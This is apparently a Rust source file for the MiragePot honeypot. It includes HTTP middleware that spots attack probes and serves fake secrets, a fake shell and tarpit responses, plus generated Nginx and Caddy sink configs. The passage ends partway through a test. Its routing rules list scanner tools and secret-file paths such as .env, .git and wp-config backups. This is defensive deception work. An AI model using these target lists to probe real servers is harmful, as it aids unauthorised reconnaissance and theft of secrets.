use axum::body::Body as AxumBody;
use axum::extract::ConnectInfo;
use axum::response::Response as AxumResponse;
use axum::routing::{get, post};
use axum::Router;
use bytes::Bytes;
use futures_core::Future;
use http::{header, HeaderMap, HeaderName, HeaderValue, Request, Response, StatusCode, Uri};
use http_body::{Body as HttpBody, Frame};
use http_body_util::BodyExt;
use hyper_util::client::legacy::connect::HttpConnector;
use hyper_util::client::legacy::Client;
use hyper_util::rt::TokioExecutor;
use mirage_core::{
    classify_http_request, FakeShellSession, HttpDeployMode, HttpRequestView, LfiTargetHint,
    MirageEngine, PrebakedPersona, SinkFallbackTrap, TarpitKind, TarpitPermit, TrapVerdict,
};
use std::convert::Infallible;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::pin::Pin;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::Duration;
use tokio::net::TcpListener;
use tokio::time::Sleep;
use tower_layer::Layer;
use tower_service::Service;
use tracing::{info, warn};

/// A `tower::Layer` that wraps any HTTP service (Axum, Hyper, Tower) with MiragePot
/// zero-copy deception traps and slow-drip tarpits.
#[derive(Clone)]
pub struct MirageHttpLayer {
    engine: Arc<MirageEngine>,
}

impl MirageHttpLayer {
    pub fn new(engine: Arc<MirageEngine>) -> Self {
        Self { engine }
    }
}

impl<S> Layer<S> for MirageHttpLayer {
    type Service = MirageHttpService<S>;

    fn layer(&self, inner: S) -> Self::Service {
        MirageHttpService {
            inner,
            engine: self.engine.clone(),
        }
    }
}

/// A `tower::Service` middleware that inspects incoming HTTP requests:
/// - Requests to the secret admin panel prefix (`engine.admin_path_prefix()`) pass through to the router.
/// - In `BehindProxySink` mode: validates optional `required_ingress_header` and traps 100% of
///   forwarded requests (falling back to `sink_fallback_trap` for arbitrary WAF-diverted paths).
/// - In `Standalone` / `FrontlineProxy` / `Embedded` mode: intercepts attack probes and passes
///   benign requests through to `inner` (either your Rust app or the frontline reverse proxy).
#[derive(Clone)]
pub struct MirageHttpService<S> {
    inner: S,
    engine: Arc<MirageEngine>,
}

impl<S, ReqBody> Service<Request<ReqBody>> for MirageHttpService<S>
where
    S: Service<Request<ReqBody>, Response = AxumResponse> + Clone + Send + 'static,
    S::Future: Send + 'static,
    S::Error: Send + 'static,
    ReqBody: Send + 'static,
{
    type Response = AxumResponse;
    type Error = S::Error;
    type Future = Pin<Box<dyn Future<Output = Result<Self::Response, Self::Error>> + Send>>;

    fn poll_ready(&mut self, cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {
        self.inner.poll_ready(cx)
    }

    fn call(&mut self, req: Request<ReqBody>) -> Self::Future {
        self.engine
            .metrics
            .http_requests_inspected
            .fetch_add(1, Ordering::Relaxed);

        let admin_prefix = self.engine.admin_path_prefix();
        if self.engine.config().admin.enabled && req.uri().path().starts_with(admin_prefix) {
            let fut = self.inner.call(req);
            return Box::pin(fut);
        }

        let http_cfg = &self.engine.config().http;

        // In BehindProxySink mode, verify optional ingress header so direct probes bypassing WAF get 404
        if http_cfg.mode == HttpDeployMode::BehindProxySink {
            if let Some(ref req_hdr) = http_cfg.required_ingress_header {
                if !verify_ingress_header(req.headers(), req_hdr) {
                    return Box::pin(async {
                        Ok(Response::builder()
                            .status(StatusCode::NOT_FOUND)
                            .body(AxumBody::from("Not Found"))
                            .unwrap())
                    });
                }
            }
        }

        let client_ip = extract_client_ip(&req, http_cfg.real_ip_header.as_deref());
        let persona = self.engine.select_persona(client_ip);

        let user_agent = req
            .headers()
            .get(header::USER_AGENT)
            .and_then(|v| v.to_str().ok());

        // Collect selected HTTP headers for zero-overhead `sigil-filter` inspection
        let mut header_samples: Vec<(&str, &str)> = Vec::with_capacity(6);
        const INSPECTED_HEADERS: &[&str] = &[
            "user-agent",
            "referer",
            "cookie",
            "x-api-version",
            "x-forwarded-host",
            "authorization",
        ];
        if self.engine.config().sigil.enabled && self.engine.config().sigil.inspect_headers {
            for &name in INSPECTED_HEADERS {
                if let Some(val) = req.headers().get(name).and_then(|v| v.to_str().ok()) {
                    header_samples.push((name, val));
                }
            }
        }

        let view = HttpRequestView {
            method: req.method().as_str(),
            path: req.uri().path(),
            query: req.uri().query(),
            user_agent,
            header_samples: &header_samples,
        };

        let mut verdict = classify_http_request(
            &view,
            http_cfg,
            &self.engine.config().sigil,
            self.engine.sigil(),
            &persona,
        );

        // In BehindProxySink mode, ANY unmatched request diverted by Nginx/Caddy/WAF is still trapped!
        if verdict == TrapVerdict::PassThrough && http_cfg.mode == HttpDeployMode::BehindProxySink {
            verdict = fallback_verdict(http_cfg.sink_fallback_trap, req.method().as_str());
        }

        if verdict == TrapVerdict::PassThrough {
            let fut = self.inner.call(req);
            return Box::pin(fut);
        }

        if verdict.is_sigil_verdict() {
            self.engine
                .metrics
                .sigil_detections
                .fetch_add(1, Ordering::Relaxed);
        }

        self.engine
            .metrics
            .http_traps_triggered
            .fetch_add(1, Ordering::Relaxed);

        let method_str = req.method().to_string();
        let uri_str = req.uri().to_string();
        let engine = self.engine.clone();

        Box::pin(async move {
            let resp = build_trap_response(
                &engine,
                client_ip,
                &persona,
                verdict,
                &method_str,
                &uri_str,
            )
            .await;
            Ok(resp)
        })
    }
}

fn fallback_verdict(fallback: SinkFallbackTrap, method: &str) -> TrapVerdict {
    match fallback {
        SinkFallbackTrap::ApiDebug => TrapVerdict::ApiDebugEndpoint,
        SinkFallbackTrap::WordPressLogin => TrapVerdict::WordPressLogin {
            is_post_attempt: method.eq_ignore_ascii_case("POST"),
        },
        SinkFallbackTrap::SqlError => TrapVerdict::SqlInjectionError { is_postgres: false },
        SinkFallbackTrap::DotEnv => TrapVerdict::DotEnvLeak,
        SinkFallbackTrap::TarpitStream => TrapVerdict::TarpitStream {
            kind: TarpitKind::GzipSqlBackup,
        },
    }
}

fn verify_ingress_header(headers: &HeaderMap, spec: &str) -> bool {
    let Some((name, expected_val)) = spec.split_once(':') else {
        return headers.contains_key(spec.trim());
    };
    headers
        .get(name.trim())
        .and_then(|v| v.to_str().ok())
        .map(|v| v.trim() == expected_val.trim())
        .unwrap_or(false)
}

/// Build a zero-copy pre-baked response or slow-drip tarpit stream for a matched `TrapVerdict`.
pub async fn build_trap_response(
    engine: &Arc<MirageEngine>,
    client_ip: IpAddr,
    persona: &Arc<PrebakedPersona>,
    verdict: TrapVerdict,
    method: &str,
    uri: &str,
) -> AxumResponse {
    engine.record_event(
        client_ip,
        persona,
        "HTTP",
        format!("{verdict:?}"),
        format!("{method} {uri}"),
    );

    match verdict {
        TrapVerdict::PassThrough => static_response(
            persona,
            StatusCode::NOT_FOUND,
            "text/plain",
            Bytes::from_static(b"Not Found"),
            false,
        ),
        TrapVerdict::WordPressLogin { is_post_attempt } => {
            if is_post_attempt {
                if let Some(_permit) = engine.try_acquire_tarpit() {
                    tokio::time::sleep(Duration::from_millis(1800)).await;
                }
                static_response(
                    persona,
                    StatusCode::OK,
                    "text/html; charset=UTF-8",
                    persona.wp_login_error_html.clone(),
                    true,
                )
            } else {
                static_response(
                    persona,
                    StatusCode::OK,
                    "text/html; charset=UTF-8",
                    persona.wp_login_html.clone(),
                    true,
                )
            }
        }
        TrapVerdict::WordPressRestIndex => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.wp_json_index.clone(),
            true,
        ),
        TrapVerdict::WordPressUsersJson => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.wp_users_json.clone(),
            true,
        ),
        TrapVerdict::WordPressPostsJson => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.wp_posts_json.clone(),
            true,
        ),
        TrapVerdict::WordPressXmlRpc => {
            if let Some(_permit) = engine.try_acquire_tarpit() {
                tokio::time::sleep(Duration::from_millis(2000)).await;
            }
            static_response(
                persona,
                StatusCode::OK,
                "text/xml; charset=UTF-8",
                persona.wp_xmlrpc_fault_xml.clone(),
                true,
            )
        }
        TrapVerdict::WordPressConfigBackup => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.wp_config_bak.clone(),
            true,
        ),
        TrapVerdict::WordPressDebugLog => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.wp_debug_log.clone(),
            true,
        ),
        TrapVerdict::WordPressAdminAjax => static_response(
            persona,
            StatusCode::BAD_REQUEST,
            "application/json; charset=UTF-8",
            persona.wp_admin_ajax_json.clone(),
            true,
        ),
        TrapVerdict::WordPressReadme => static_response(
            persona,
            StatusCode::OK,
            "text/html; charset=UTF-8",
            persona.wp_readme_html.clone(),
            true,
        ),
        TrapVerdict::DotEnvLeak => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.dotenv_body.clone(),
            false,
        ),
        TrapVerdict::GitConfigLeak => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.git_config_body.clone(),
            false,
        ),
        TrapVerdict::GitHeadLeak => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.git_head_body.clone(),
            false,
        ),
        TrapVerdict::SpringActuatorEnv => static_response(
            persona,
            StatusCode::OK,
            "application/vnd.spring-boot.actuator.v3+json; charset=UTF-8",
            persona.actuator_env_json.clone(),
            false,
        ),
        TrapVerdict::PhpInfo => static_response(
            persona,
            StatusCode::OK,
            "text/html; charset=UTF-8",
            persona.phpinfo_html.clone(),
            false,
        ),
        TrapVerdict::GraphqlIntrospection => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.graphql_introspection_json.clone(),
            false,
        ),
        TrapVerdict::OpenApiSchema => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.openapi_json.clone(),
            false,
        ),
        TrapVerdict::ApiDebugEndpoint => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.api_debug_json.clone(),
            false,
        ),
        TrapVerdict::SqlInjectionError { is_postgres } => {
            let body = if is_postgres {
                persona.sqli_error_postgres_html.clone()
            } else {
                persona.sqli_error_mysql_html.clone()
            };
            static_response(
                persona,
                StatusCode::INTERNAL_SERVER_ERROR,
                "text/html; charset=UTF-8",
                body,
                false,
            )
        }
        TrapVerdict::SqlInjectionBoolean { truthy } => {
            let body = if truthy {
                persona.sqli_boolean_true_html.clone()
            } else {
                persona.sqli_boolean_false_html.clone()
            };
            static_response(persona, StatusCode::OK, "text/html; charset=UTF-8", body, false)
        }
        TrapVerdict::SqlInjectionTimeBlind { delay_ms } => {
            if let Some(_permit) = engine.try_acquire_tarpit() {
                tokio::time::sleep(Duration::from_millis(delay_ms)).await;
            }
            static_response(
                persona,
                StatusCode::OK,
                "text/html; charset=UTF-8",
                persona.sqli_boolean_true_html.clone(),
                false,
            )
        }
        TrapVerdict::TarpitStream { kind } => {
            let (content_type, disposition, chunk) = match kind {
                TarpitKind::GzipSqlBackup => (
                    "application/gzip",
                    "attachment; filename=\"prod_ledger_full_dump.sql.gz\"",
                    persona.tarpit_gzip_chunk.clone(),
                ),
                TarpitKind::JavaHprof => (
                    "application/octet-stream",
                    "attachment; filename=\"heapdump.hprof\"",
                    persona.tarpit_hprof_chunk.clone(),
                ),
            };

            let advertised_size = engine.config().http.fake_archive_size_bytes;
            let drip_rate = engine.config().tarpit_drip_bytes_per_sec.max(16);

            if let Some(permit) = engine.try_acquire_tarpit() {
                let drip_body = TarpitDripBody::new(
                    engine.clone(),
                    chunk,
                    advertised_size,
                    drip_rate,
                    permit,
                );
                let mut resp = Response::builder()
                    .status(StatusCode::OK)
                    .header(header::CONTENT_TYPE, content_type)
                    .header(header::CONTENT_DISPOSITION, disposition)
                    .header(header::CONTENT_LENGTH, advertised_size.to_string())
                    .body(AxumBody::new(drip_body))
                    .unwrap();
                inject_persona_headers(persona, &mut resp, false);
                resp
            } else {
                static_response(persona, StatusCode::OK, content_type, chunk, false)
            }
        }
        TrapVerdict::PathTraversalLfi { target, .. } => {
            let body = match target {
                LfiTargetHint::EtcPasswd => persona.lfi_etc_passwd_body.clone(),
                LfiTargetHint::ProcSelfEnviron => persona.lfi_proc_environ_body.clone(),
                LfiTargetHint::DotEnv => persona.dotenv_body.clone(),
            };
            static_response(persona, StatusCode::OK, "text/plain; charset=UTF-8", body, false)
        }
        TrapVerdict::CommandInjectionRce { extracted_cmd, .. } => {
            let mut shell = FakeShellSession::new(persona.clone(), Some("www-data"));
            let res = shell.execute_line(&extracted_cmd);
            if res.delay_ms > 0 {
                if let Some(_permit) = engine.try_acquire_tarpit() {
                    tokio::time::sleep(Duration::from_millis(res.delay_ms.min(2500))).await;
                }
            }
            static_response(
                persona,
                StatusCode::OK,
                "text/plain; charset=UTF-8",
                Bytes::from(res.output),
                false,
            )
        }
        TrapVerdict::SsrfCloudMetadata { .. } => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.ssrf_aws_imds_json.clone(),
            false,
        ),
        TrapVerdict::SstiTemplateEval { .. } => static_response(
            persona,
            StatusCode::OK,
            "text/html; charset=UTF-8",
            persona.ssti_eval_html.clone(),
            false,
        ),
        TrapVerdict::NoSqlAdminDump { .. } => static_response(
            persona,
            StatusCode::OK,
            "application/json; charset=UTF-8",
            persona.nosql_dump_json.clone(),
            false,
        ),
        TrapVerdict::XxeEntityLeak { .. } => static_response(
            persona,
            StatusCode::OK,
            "application/xml; charset=UTF-8",
            persona.xxe_response_xml.clone(),
            false,
        ),
        TrapVerdict::DeserializationJndiTrap { .. } => {
            if let Some(_permit) = engine.try_acquire_tarpit() {
                tokio::time::sleep(Duration::from_millis(900)).await;
            }
            static_response(
                persona,
                StatusCode::INTERNAL_SERVER_ERROR,
                "text/plain; charset=UTF-8",
                persona.deser_jndi_trace_html.clone(),
                false,
            )
        }
        TrapVerdict::LdapDirectoryDump { .. } => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.ldap_dump_ldif.clone(),
            false,
        ),
        TrapVerdict::XssBaitPage { .. } => {
            let mut resp = static_response(
                persona,
                StatusCode::OK,
                "text/html; charset=UTF-8",
                persona.xss_bait_html.clone(),
                false,
            );
            // Set a tempting non-HttpOnly fake admin cookie
            if let Ok(cookie) = HeaderValue::from_str(&format!(
                "admin_session_id={}; Path=/",
                &persona.wp_cookie_hash
            )) {
                resp.headers_mut().insert(header::SET_COOKIE, cookie);
            }
            resp
        }
        TrapVerdict::CrlfProxyDebug { .. } => static_response(
            persona,
            StatusCode::OK,
            "text/plain; charset=UTF-8",
            persona.crlf_proxy_debug_html.clone(),
            false,
        ),
    }
}

fn static_response(
    persona: &PrebakedPersona,
    status: StatusCode,
    content_type: &'static str,
    body: Bytes,
    is_wordpress: bool,
) -> AxumResponse {
    let mut resp = Response::builder()
        .status(status)
        .header(header::CONTENT_TYPE, content_type)
        .header(header::CONTENT_LENGTH, body.len().to_string())
        .body(AxumBody::from(body))
        .unwrap();
    inject_persona_headers(persona, &mut resp, is_wordpress);
    resp
}

fn inject_persona_headers<B>(
    persona: &PrebakedPersona,
    resp: &mut Response<B>,
    is_wordpress: bool,
) {
    if let Ok(val) = HeaderValue::from_str(&persona.server_header) {
        resp.headers_mut().insert(header::SERVER, val);
    }
    if let Ok(val) = HeaderValue::from_str(&persona.powered_by_header) {
        resp.headers_mut()
            .insert(HeaderName::from_static("x-powered-by"), val);
    }
    if let Ok(val) = HeaderValue::from_str(&persona.hostname) {
        resp.headers_mut()
            .insert(HeaderName::from_static("x-backend-node"), val);
    }
    if is_wordpress {
        if let Ok(pingback) =
            HeaderValue::from_str(&format!("http://{}.internal/xmlrpc.php", persona.hostname))
        {
            resp.headers_mut()
                .insert(HeaderName::from_static("x-pingback"), pingback);
        }
        if let Ok(link) = HeaderValue::from_str(&format!(
            "<http://{}.internal/wp-json/>; rel=\"https://api.w.org/\"",
            persona.hostname
        )) {
            resp.headers_mut().insert(header::LINK, link);
        }
        if let Ok(cookie) = HeaderValue::from_str(&format!(
            "wordpress_test_cookie=WP%20Cookie%20check; path=/; wordpress_sec_{}=expired; path=/wp-admin",
            &persona.wp_cookie_hash[..16]
        )) {
            resp.headers_mut().insert(header::SET_COOKIE, cookie);
        }
    }
}

fn extract_client_ip<B>(req: &Request<B>, preferred_header: Option<&str>) -> IpAddr {
    // 1. Check configured real_ip_header (e.g. X-Real-IP, CF-Connecting-IP)
    if let Some(hdr_name) = preferred_header {
        if let Some(val) = req.headers().get(hdr_name).and_then(|v| v.to_str().ok()) {
            if let Some(first) = val.split(',').next() {
                if let Ok(ip) = first.trim().parse::<IpAddr>() {
                    return ip;
                }
            }
        }
    }
    // 2. Fallback to X-Forwarded-For
    if let Some(xff) = req
        .headers()
        .get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
    {
        if let Some(first_ip) = xff.split(',').next() {
            if let Ok(ip) = first_ip.trim().parse::<IpAddr>() {
                return ip;
            }
        }
    }
    // 3. Socket ConnectInfo
    if let Some(ConnectInfo(addr)) = req.extensions().get::<ConnectInfo<SocketAddr>>() {
        return addr.ip();
    }
    IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
}

/// Zero-allocation slow-drip HTTP body stream for tarpitting scanners & data exfiltration tools.
pub struct TarpitDripBody {
    engine: Arc<MirageEngine>,
    chunk: Bytes,
    cursor: usize,
    remaining_bytes: u64,
    drip_bytes_per_tick: usize,
    tick_interval: Duration,
    sleep: Option<Pin<Box<Sleep>>>,
    first_frame_sent: bool,
    _permit: TarpitPermit,
}

impl TarpitDripBody {
    pub fn new(
        engine: Arc<MirageEngine>,
        chunk: Bytes,
        total_bytes: u64,
        bytes_per_sec: usize,
        permit: TarpitPermit,
    ) -> Self {
        let drip_bytes_per_tick = (bytes_per_sec / 4).clamp(8, 1024);
        Self {
            engine,
            chunk,
            cursor: 0,
            remaining_bytes: total_bytes,
            drip_bytes_per_tick,
            tick_interval: Duration::from_millis(250),
            sleep: None,
            first_frame_sent: false,
            _permit: permit,
        }
    }
}

impl HttpBody for TarpitDripBody {
    type Data = Bytes;
    type Error = Infallible;

    fn poll_frame(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Option<Result<Frame<Self::Data>, Self::Error>>> {
        if self.remaining_bytes == 0 {
            return Poll::Ready(None);
        }

        if self.first_frame_sent {
            if self.sleep.is_none() {
                self.sleep = Some(Box::pin(tokio::time::sleep(self.tick_interval)));
            }
            if let Some(sleep) = self.sleep.as_mut() {
                match sleep.as_mut().poll(cx) {
                    Poll::Pending => return Poll::Pending,
                    Poll::Ready(()) => {
                        self.sleep = None;
                    }
                }
            }
        } else {
            self.first_frame_sent = true;
        }

        let to_send = (self.drip_bytes_per_tick as u64)
            .min(self.remaining_bytes)
            .min((self.chunk.len() - self.cursor) as u64) as usize;

        let slice = self.chunk.slice(self.cursor..self.cursor + to_send);
        self.cursor = (self.cursor + to_send) % self.chunk.len();
        self.remaining_bytes -= to_send as u64;

        self.engine
            .metrics
            .tarpit_bytes_dripped
            .fetch_add(to_send as u64, Ordering::Relaxed);

        Poll::Ready(Some(Ok(Frame::data(slice))))
    }
}

/// Transparently reverse-proxy a benign HTTP request to `upstream_base_url` in `FrontlineProxy` mode.
async fn proxy_to_upstream(
    client: Client<HttpConnector, AxumBody>,
    upstream_base_url: String,
    req: Request<AxumBody>,
    preferred_ip_hdr: Option<String>,
) -> AxumResponse {
    let client_ip = extract_client_ip(&req, preferred_ip_hdr.as_deref());
    let path_and_query = req
        .uri()
        .path_and_query()
        .map(|pq| pq.as_str())
        .unwrap_or("/");
    let target_uri_str = format!("{}{}", upstream_base_url.trim_end_matches('/'), path_and_query);
    let Ok(target_uri) = target_uri_str.parse::<Uri>() else {
        return Response::builder()
            .status(StatusCode::BAD_GATEWAY)
            .body(AxumBody::from("Invalid upstream URI"))
            .unwrap();
    };

    let (mut parts, body) = req.into_parts();
    parts.uri = target_uri.clone();
    parts.headers.remove(header::HOST);
    parts.headers.remove(header::CONNECTION);
    if let Some(authority) = target_uri.authority() {
        if let Ok(val) = HeaderValue::from_str(authority.as_str()) {
            parts.headers.insert(header::HOST, val);
        }
    }
    if let Ok(ip_val) = HeaderValue::from_str(&client_ip.to_string()) {
        parts
            .headers
            .insert(HeaderName::from_static("x-forwarded-for"), ip_val);
    }

    let outbound_req = Request::from_parts(parts, body);
    match client.request(outbound_req).await {
        Ok(upstream_resp) => {
            let (resp_parts, resp_body) = upstream_resp.into_parts();
            let collected = resp_body
                .collect()
                .await
                .map(|c| c.to_bytes())
                .unwrap_or_default();
            Response::from_parts(resp_parts, AxumBody::from(collected))
        }
        Err(err) => {
            warn!(error = %err, %upstream_base_url, "Frontline reverse proxy upstream error");
            Response::builder()
                .status(StatusCode::BAD_GATEWAY)
                .body(AxumBody::from("Bad Gateway"))
                .unwrap()
        }
    }
}

fn check_admin_token(headers: &HeaderMap, expected: &Option<String>) -> bool {
    let Some(expected_tok) = expected else {
        return true;
    };
    headers
        .get("x-mirage-token")
        .and_then(|v| v.to_str().ok())
        .map(|v| v == expected_tok)
        .unwrap_or(false)
}

/// Build the HTTP Axum `Router` respecting `HttpDeployMode`:
/// - `Standalone`: default minimal gateway route + traps + secret admin panel
/// - `FrontlineProxy`: benign requests are reverse-proxied to `upstream_http_url`; attacks are trapped
/// - `BehindProxySink`: 100% of WAF-diverted requests are trapped by `MirageHttpLayer`
pub fn build_standalone_router(engine: Arc<MirageEngine>) -> Router {
    let http_cfg = engine.config().http.clone();

    let mut router = match (http_cfg.mode, http_cfg.upstream_http_url.clone()) {
        (HttpDeployMode::FrontlineProxy, Some(upstream_url)) => {
            let client: Client<HttpConnector, AxumBody> =
                Client::builder(TokioExecutor::new()).build_http();
            let pref_hdr = http_cfg.real_ip_header.clone();
            Router::new().fallback(move |req: Request<AxumBody>| {
                let c = client.clone();
                let u = upstream_url.clone();
                let h = pref_hdr.clone();
                async move { proxy_to_upstream(c, u, req, h).await }
            })
        }
        _ => Router::new().route(
            "/",
            get(|| async {
                "Welcome to Internal Service Gateway. All endpoints require authentication.\n"
            }),
        ),
    };

    if engine.config().admin.enabled {
        let prefix = engine.admin_path_prefix().to_string();
        let status_route = format!("{prefix}/status");
        let rotate_route = format!("{prefix}/rotate");

        let engine_for_status = engine.clone();
        let engine_for_rotate = engine.clone();

        router = router
            .route(
                &status_route,
                get(move |headers: HeaderMap| {
                    let eng = engine_for_status.clone();
                    async move {
                        if !check_admin_token(&headers, &eng.config().admin.secret_token) {
                            return Response::builder()
                                .status(StatusCode::NOT_FOUND)
                                .body(AxumBody::from("Not Found"))
                                .unwrap();
                        }
                        let snap = eng.current_snapshot();
                        let body = serde_json::json!({
                            "epoch_id": snap.epoch_id,
                            "generated_at_unix": snap.generated_at_unix,
                            "http_mode": eng.config().http.mode,
                            "ssh_mode": eng.config().ssh.mode,
                            "admin_path_prefix": eng.admin_path_prefix(),
                            "persona_slots": snap.personas.len(),
                            "sample_personas": snap.personas.iter().take(4).map(|p| serde_json::json!({
                                "slot_id": p.slot_id,
                                "hostname": p.hostname,
                                "internal_ip": p.internal_ip,
                                "server_header": p.server_header,
                                "wp_version": p.wp_version,
                                "ssh_banner": p.ssh_banner,
                                "ssh_cve_profile": p.ssh_cve_profile,
                                "redis_version": p.redis_data.redis_version,
                                "postgres_version": p.postgres_data.server_version_short,
                            })).collect::<Vec<_>>(),
                            "metrics": eng.metrics_snapshot(),
                            "recent_events": eng.recent_events(),
                        });
                        Response::builder()
                            .status(StatusCode::OK)
                            .header(header::CONTENT_TYPE, "application/json")
                            .body(AxumBody::from(serde_json::to_vec_pretty(&body).unwrap()))
                            .unwrap()
                    }
                }),
            )
            .route(
                &rotate_route,
                post(move |headers: HeaderMap| {
                    let eng = engine_for_rotate.clone();
                    async move {
                        if !check_admin_token(&headers, &eng.config().admin.secret_token) {
                            return Response::builder()
                                .status(StatusCode::NOT_FOUND)
                                .body(AxumBody::from("Not Found"))
                                .unwrap();
                        }
                        let new_snap = eng.rotate_now();
                        let body = serde_json::json!({
                            "status": "rotated",
                            "new_epoch_id": new_snap.epoch_id,
                            "sample_hostname": new_snap.personas[0].hostname,
                        });
                        Response::builder()
                            .status(StatusCode::OK)
                            .header(header::CONTENT_TYPE, "application/json")
                            .body(AxumBody::from(serde_json::to_vec_pretty(&body).unwrap()))
                            .unwrap()
                    }
                }),
            );
    }

    router.layer(MirageHttpLayer::new(engine))
}

/// Run the HTTP server in the configured `HttpDeployMode` (`standalone`, `frontline_proxy`, or `behind_proxy_sink`).
pub async fn run_standalone_http_server(engine: Arc<MirageEngine>) -> std::io::Result<()> {
    let bind_addr = engine.config().http.bind_addr;
    let mode = engine.config().http.mode;
    let listener = TcpListener::bind(bind_addr).await?;
    if engine.config().admin.enabled {
        info!(
            %bind_addr,
            ?mode,
            upstream = ?engine.config().http.upstream_http_url,
            status_url = %format!("http://{}{}/status", bind_addr, engine.admin_path_prefix()),
            rotate_url = %format!("http://{}{}/rotate", bind_addr, engine.admin_path_prefix()),
            "MiragePot HTTP engine listening"
        );
    } else {
        info!(%bind_addr, ?mode, "MiragePot HTTP engine listening (admin panel disabled)");
    }
    let app = build_standalone_router(engine);
    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
}

/// Generate a ready-to-use Nginx configuration showing how to place MiragePot BEHIND Nginx
/// in `behind_proxy_sink` mode (diverting scanner/WAF/attack routes into MiragePot while keeping
/// real traffic flowing to your real app).
pub fn generate_nginx_sink_config(mirage_addr: &str, real_upstream: &str) -> String {
    format!(
        r#"# ============================================================================
# MiragePot Behind-Proxy Sink Integration for Nginx
# ============================================================================
# Run MiragePot with:
#   mirage-daemon --http-mode behind_proxy_sink --http-addr {mirage_addr}
#
# And set in config.toml:
#   [http]
#   mode = "behind_proxy_sink"
#   real_ip_header = "x-real-ip"
#   required_ingress_header = "X-Mirage-Sink: replace_with_shared_secret"
#   sink_fallback_trap = "api_debug"

upstream real_app {{
    server {real_upstream};
}}

upstream mirage_honeypot_sink {{
    server {mirage_addr};
    keepalive 32;
}}

# Map known scanner User-Agents directly into the honeypot sink
map $http_user_agent $is_scanner_ua {{
    default 0;
    ~*(sqlmap|nuclei|nikto|wpscan|dirsearch|gobuster|ffuf|masscan|zgrab|acunetix) 1;
}}

server {{
    listen 80;
    server_name example.com;

    # 1. Divert WordPress / secret leaks / actuator / SQL backup probes straight to MiragePot
    location ~* ^/(wp-login\.php|wp-admin|wp-json|xmlrpc\.php|wp-config|wp-content/debug\.log|\.env|\.git|actuator|phpinfo\.php|backup\.sql|heapdump) {{
        proxy_pass http://mirage_honeypot_sink;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Mirage-Sink "replace_with_shared_secret";
        proxy_buffering off; # Important for Tarpit slow-drip streams!
    }}

    # 2. Divert scanner User-Agents or WAF-blocked requests via named location
    location @mirage_sink {{
        proxy_pass http://mirage_honeypot_sink;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Mirage-Sink "replace_with_shared_secret";
        proxy_buffering off;
    }}

    # 3. Normal business traffic goes to your real backend (unless flagged by $is_scanner_ua or WAF 403)
    location / {{
        if ($is_scanner_ua = 1) {{
            return 418;
        }}
        error_page 418 = @mirage_sink;
        proxy_pass http://real_app;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }}
}}
"#
    )
}

/// Generate a ready-to-use Caddyfile showing how to place MiragePot BEHIND Caddy.
pub fn generate_caddy_sink_config(mirage_addr: &str, real_upstream: &str) -> String {
    format!(
        r#"# ============================================================================
# MiragePot Behind-Proxy Sink Integration for Caddy
# ============================================================================
example.com {{
    @attack_probes {{
        path /wp-login.php /wp-admin/* /wp-json* /xmlrpc.php /wp-config* /.env* /.git/* /actuator/* /phpinfo.php *.sql.gz /heapdump
    }}
    @scanners {{
        header_regexp User-Agent (?i)(sqlmap|nuclei|nikto|wpscan|dirsearch|gobuster|ffuf|masscan)
    }}

    handle @attack_probes {{
        reverse_proxy {mirage_addr} {{
            header_up X-Real-IP {{remote_host}}
            header_up X-Mirage-Sink "replace_with_shared_secret"
            flush_interval -1
        }}
    }}

    handle @scanners {{
        reverse_proxy {mirage_addr} {{
            header_up X-Real-IP {{remote_host}}
            header_up X-Mirage-Sink "replace_with_shared_secret"
            flush_interval -1
        }}
    }}

    handle {{
        reverse_proxy {real_upstream}
    }}
}}
"#
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use mirage_core::MirageConfig;
    use tower::ServiceExt;

    #[tokio::test]
    async fn test_tower_layer_wordpress_headers_and_randomized_admin_url() {
        let mut cfg = MirageConfig::default();
        cfg.http.sqli_time_delay_ms = 10;
        let engine = MirageEngine::new(cfg);
        let app = build_standalone_router(engine.clone());

        let req_old_admin = Request::builder()
            .uri("/_mirage/status")
            .body(AxumBody::empty())
            .unwrap();
        let resp_old = app.clone().oneshot(req_old_admin).await.unwrap();
        assert_eq!(resp_old.status(), StatusCode::NOT_FOUND);

        let secret_status_uri = format!("{}/status", engine.admin_path_prefix());
        let req_secret_admin = Request::builder()
            .uri(&secret_status_uri)
            .body(AxumBody::empty())
            .unwrap();
        let resp_secret = app.clone().oneshot(req_secret_admin).await.unwrap();
        assert_eq!(resp_secret.status(), StatusCode::OK);

        let req_wp_bak = Request::builder()
            .uri("/wp-config.php.bak")
            .header("x-real-ip", "198.51.100.12")
            .body(AxumBody::empty())
            .unwrap();
        let resp_wp_bak = app.clone().oneshot(req_wp_bak).await.unwrap();
        assert_eq!(resp_wp_bak.status(), StatusCode::OK);
